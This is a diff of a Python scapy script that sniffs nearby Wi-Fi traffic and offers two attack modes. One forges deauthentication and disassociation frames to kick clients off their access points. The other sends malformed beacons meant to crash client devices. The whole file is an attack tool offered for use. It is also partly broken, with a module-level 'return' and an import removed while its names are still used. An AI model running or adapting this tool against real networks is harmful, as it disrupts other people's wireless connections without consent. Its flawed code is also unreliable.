@@ -1,23 +1,36 @@
 from scapy.all import *
-import time,random,os
+r,t=random,time
 
+#tool start
 print('set interface to:')
 a=input('')
 mon=a
-def packet_handler(packet):
-	if packet.haslayer(Dot11):
-		def dd(B,st):
-			return st.join(chr(random.randint(0,255)) for _ in range(random.randint(27,B)))
-		if packet.type == 2 and packet.subtype in [4,10,8,12] and packet.dBm_AntSignal < -40:
-			l0=packet.addr1
-			l1=packet.addr2
-			l2=packet.addr3
-			print(f'<SCAN> ROUTER={packet.addr3} ::: CLIENT={packet.addr2} ::: BDCAST={packet.addr1}')
-			#print(repr(packet))
-			ph=RadioTap()/Dot11(addr1=[l0,l2],addr2=[l1,l2],addr3=[l2,l0],type=0,subtype=[0,2,4,10])/Raw(dd(B=128,st='\x00'))
-			pf=RadioTap()/Dot11(addr1=l1,addr2=l2,addr3=l2,type=[0,1],subtype=8)
-			sendp(ph,iface=mon,count=1,verbose=0)
-			sendp(pf,iface=mon,count=32,verbose=0)
-os.system('clear')
+#-------------------
+
+R=RadioTap()
+def crash_proc(p):
+	if p.haslayer(Dot11):
+		if p.type == 2 and p.subtype in {4,8,12}:
+			print(f'<info> send malformed Beacon from AP {p.addr3} to CLIENT {p.addr2}')
+			sendp(R/Dot11(type=[0,1],subtype=8,addr1=p.addr2,addr2=p.addr3,addr3=p.addr3),iface=mon,count=1,verbose=0)
+
+def kick_proc(p):
+	if p.haslayer(Dot11):
+		if p.type == 2 and p.subtype in {4,8,12}:
+			print(f'<info> disconnected CLIENT {p.addr2} from AP {p.addr3} # Broadcast {p.addr1}')
+			sendp(R/Dot11(type=0,subtype=[0,10,12],addr1=p.addr1,addr2=p.addr2,addr3=p.addr3)/Raw(load=b'\x04'*r.randint(8,32)),iface=mon,count=1,verbose=0)
+
+#tool select
+print('select attack mode:')
+print('0 AUTOKICK CLIENTS | 1 CRASH CLIENTS')
+pgo=input('')
+
+if len(pgo) <= 0:
+	print('nothing selected')
+	return
+
 print('<INTERFACE> scanning WIFI Access Points..')
-sniff(iface=mon,prn=packet_handler)
+if pgo == '0':
+	sniff(iface=mon,prn=kick_proc)
+elif pgo == '1':
+	sniff(iface=mon,prn=crash_proc)
